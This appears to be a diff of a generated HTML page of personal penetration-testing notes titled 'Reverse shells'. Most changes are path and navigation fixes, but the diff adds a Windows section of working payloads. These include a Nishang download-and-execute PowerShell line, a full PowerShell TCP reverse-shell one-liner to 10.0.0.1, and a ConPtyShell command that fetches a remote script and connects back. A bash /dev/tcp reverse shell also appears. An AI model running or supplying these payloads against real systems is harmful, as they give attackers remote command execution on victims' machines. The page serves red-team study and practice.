@@ -9,7 +9,7 @@
       
       
       
-      <link rel="shortcut icon" href="../assets/images/favicon.png">
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.8">
     
     
@@ -18,10 +18,10 @@
       
     
     
-      <link rel="stylesheet" href="../assets/stylesheets/main.cb6bc1d0.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.cb6bc1d0.min.css">
       
         
-        <link rel="stylesheet" href="../assets/stylesheets/palette.39b8e14a.min.css">
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.39b8e14a.min.css">
         
           
           
@@ -75,7 +75,7 @@
 
 <header class="md-header" data-md-component="header">
   <nav class="md-header-nav md-grid" aria-label="Header">
-    <a href=".." title="Notes" class="md-header-nav__button md-logo" aria-label="Notes">
+    <a href="../.." title="Notes" class="md-header-nav__button md-logo" aria-label="Notes">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
@@ -157,7 +157,7 @@
 
 <nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href=".." title="Notes" class="md-nav__button md-logo" aria-label="Notes">
+    <a href="../.." title="Notes" class="md-nav__button md-logo" aria-label="Notes">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
@@ -176,7 +176,7 @@
   
   
     <li class="md-nav__item">
-      <a href=".." class="md-nav__link">
+      <a href="../.." class="md-nav__link">
         Home
       </a>
     </li>
@@ -254,13 +254,6 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#general-info" class="md-nav__link">
-    General info
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
   <a href="#bash" class="md-nav__link">
     Bash
   </a>
@@ -321,7 +314,46 @@
     Groovy
   </a>
   
-    <nav class="md-nav" aria-label="Groovy">
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-reverse-shells" class="md-nav__link">
+    Windows reverse shells
+  </a>
+  
+    <nav class="md-nav" aria-label="Windows reverse shells">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nishang" class="md-nav__link">
+    Nishang
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#conpty" class="md-nav__link">
+    ConPty
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#general-tricks-and-upgrading-the-shell" class="md-nav__link">
+    General tricks and upgrading the shell
+  </a>
+  
+    <nav class="md-nav" aria-label="General tricks and upgrading the shell">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -335,16 +367,35 @@
     </nav>
   
 </li>
-        
-      </ul>
-    </nav>
-  
-</li>
       
     </ul>
   
 </nav>
       
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../remote/" class="md-nav__link">
+        Remote Access
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../webshells/" class="md-nav__link">
+        Web Shells
+      </a>
     </li>
   
 
@@ -371,32 +422,6 @@
                 <h1 id="reverse-shells">Reverse shells</h1>
 <p>Compendium of reverse shells.</p>
 <h2 id="linux-and-os-agnostic-reverse-shells">Linux and OS agnostic reverse shells</h2>
-<h3 id="general-info">General info</h3>
-<p>When catching reverse shells with netcat on a port (e.g. using <code>nc -lvnp 4444</code>) you can find a lot of times that is hard to edit commands if you make a typo or whatever. This is due to losing access to some "terminal enhancers" we have on default shell session in our machine. One of them is ReadLine that allow you to edit your commands or use your arrow keys to rotate between them. It is possible to replicate that functionality into the reverse shell prepending the listening shell with <code>rlwrap</code>.
-Example:
-<code>rlwrap nc -lvnp 1234</code></p>
-<p>Another improvement for the shell could be putting the "host" shell on raw mode to use keyboard shortcuts or editor programs on your reverse shell.
-That can be achieved doing the following:</p>
-<div class="highlight"><pre><span></span><code>ctrl+z
-<span class="nb">echo</span> <span class="nv">$TERM</span> <span class="o">&amp;&amp;</span> tput lines <span class="o">&amp;&amp;</span> tput cols
-
-<span class="c1"># for bash</span>
-stty raw -echo
-<span class="nb">fg</span>
-
-<span class="c1"># for zsh</span>
-stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
-
-reset
-<span class="nb">export</span> <span class="nv">SHELL</span><span class="o">=</span>bash
-<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm-256color
-stty rows &lt;num&gt; columns &lt;cols&gt;
-</code></pre></div>
-<p>Note the detail on zsh. The motivation behind doing the trick different resides on this information taken from PayloadsAllTheThings repo:</p>
-<div class="admonition quote">
-<p class="admonition-title">Quote</p>
-<p>The main problem here is that zsh doesn't handle the stty command the same way bash or sh does. [...] stty raw -echo; fg[...] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect</p>
-</div>
 <h3 id="bash">Bash</h3>
 <div class="highlight"><pre><span></span><code>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.0.0.1/8080 <span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span> 
 </code></pre></div>
@@ -455,6 +480,64 @@ Victim:</p>
 <p class="admonition-title">Hint</p>
 <p>Useful when exploiting Jenkins. If your Jenkins privileges let you to access groovy console (Tipically found at <code>/script</code> on jenkins GUI) it is possible to use this reverse shell to get RCE.</p>
 </div>
+<h2 id="windows-reverse-shells">Windows reverse shells</h2>
+<p>Windows by default could use any of the above shells if there is present any of the languages. If not, a typical approach is going with Powershell.</p>
+<h3 id="nishang">Nishang</h3>
+<ul>
+<li><a href="https://github.com/samratashok/nishang">Nishang Github</a></li>
+</ul>
+<div class="admonition quote">
+<p class="admonition-title">Quote</p>
+<p>Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.</p>
+</div>
+<p>In memory execution:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://&lt;yourwebserver&gt;/Invoke-PowerShellTcp.ps1&#39;</span><span class="p">);</span><span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="no">[IP]</span> <span class="n">-Port</span> <span class="no">[PortNo.]</span>
+</code></pre></div>
+<p>You can also add in the file the last line <code>Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]</code> to the script and do the same function in one command.<br>
+Powershell One-Liner:
+<div class="highlight"><pre><span></span><code><span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TCPClient</span><span class="p">(</span><span class="s1">&#39;10.0.0.1&#39;</span><span class="p">,</span><span class="n">4444</span><span class="p">);</span><span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="n">GetStream</span><span class="p">();</span><span class="no">[byte[]]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="n">0</span><span class="p">..</span><span class="n">65535</span><span class="p">|%{</span><span class="n">0</span><span class="p">};</span><span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">){;</span><span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="n">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$data</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">);</span><span class="nv">$sendback2</span>  <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s1">&#39;PS &#39;</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="n">Path</span> <span class="p">+</span> <span class="s1">&#39;&gt; &#39;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+</code></pre></div></p>
+<h3 id="conpty">ConPty</h3>
+<ul>
+<li><a href="https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1">Github</a></li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="n">IEX</span><span class="p">(</span><span class="nb">IWR </span><span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">raw</span><span class="p">.</span><span class="n">githubusercontent</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">antonioCoco</span><span class="p">/</span><span class="n">ConPtyShell</span><span class="p">/</span><span class="n">master</span><span class="p">/</span><span class="nb">Invoke-ConPtyShell</span><span class="p">.</span><span class="n">ps1</span><span class="p">);</span> <span class="nb">Invoke-ConPtyShell</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span> <span class="n">3001</span>
+</code></pre></div>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>Fully interactive shell, but needs Rows and Cols. As noted on the repo, it is possible to avoid setting these params if the listener is started like this: <code>stty raw -echo; (stty size; cat) | nc -lvnp 3001</code></p>
+</div>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<p>Requirements: <br>
+Client Side: Windows version &gt;= 10 / 2019 1809 (build &gt;= 10.0.17763)</p>
+</div>
+<h2 id="general-tricks-and-upgrading-the-shell">General tricks and upgrading the shell</h2>
+<p>When catching reverse shells with netcat on a port (e.g. using <code>nc -lvnp 4444</code>) you can find a lot of times that is hard to edit commands if you make a typo or whatever. This is due to losing access to some "terminal enhancers" we have on default shell session in our machine. One of them is ReadLine that allow you to edit your commands or use your arrow keys to rotate between them. It is possible to replicate that functionality into the reverse shell prepending the listening shell with <code>rlwrap</code>.
+Example:
+<code>rlwrap nc -lvnp 1234</code></p>
+<p>Another improvement for the shell could be putting the "host" shell on raw mode to use keyboard shortcuts or editor programs on your reverse shell.
+That can be achieved doing the following:</p>
+<div class="highlight"><pre><span></span><code>ctrl+z
+<span class="nb">echo</span> <span class="nv">$TERM</span> <span class="o">&amp;&amp;</span> tput lines <span class="o">&amp;&amp;</span> tput cols
+
+<span class="c1"># for bash</span>
+stty raw -echo
+<span class="nb">fg</span>
+
+<span class="c1"># for zsh</span>
+stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+
+reset
+<span class="nb">export</span> <span class="nv">SHELL</span><span class="o">=</span>bash
+<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm-256color
+stty rows &lt;num&gt; columns &lt;cols&gt;
+</code></pre></div>
+<p>Note the detail on zsh. The motivation behind doing the trick different resides on this information taken from PayloadsAllTheThings repo:</p>
+<div class="admonition quote">
+<p class="admonition-title">Quote</p>
+<p>The main problem here is that zsh doesn't handle the stty command the same way bash or sh does. [...] stty raw -echo; fg[...] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect</p>
+</div>
 <h4 id="references">References</h4>
 <ul>
 <li>Pentest Monkey</li>
@@ -479,7 +562,7 @@ Victim:</p>
     <div class="md-footer-nav">
       <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
         
-          <a href=".." class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+          <a href="../.." class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
             <div class="md-footer-nav__button md-icon">
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
             </div>
@@ -493,6 +576,20 @@ Victim:</p>
             </div>
           </a>
         
+        
+          <a href="../remote/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                Remote Access
+              </div>
+            </div>
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+            </div>
+          </a>
         
       </nav>
     </div>
@@ -513,15 +610,15 @@ Victim:</p>
       
     </div>
     
-      <script src="../assets/javascripts/vendor.18f0862e.min.js"></script>
-      <script src="../assets/javascripts/bundle.994580cf.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      <script src="../../assets/javascripts/vendor.18f0862e.min.js"></script>
+      <script src="../../assets/javascripts/bundle.994580cf.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
       
       <script>
         app = initialize({
-          base: "..",
+          base: "../..",
           features: ['navigation.expand', 'toc.integrate'],
           search: Object.assign({
-            worker: "../assets/javascripts/worker/search.9c0e82ba.min.js"
+            worker: "../../assets/javascripts/worker/search.9c0e82ba.min.js"
           }, typeof search !== "undefined" && search)
         })
       </script>
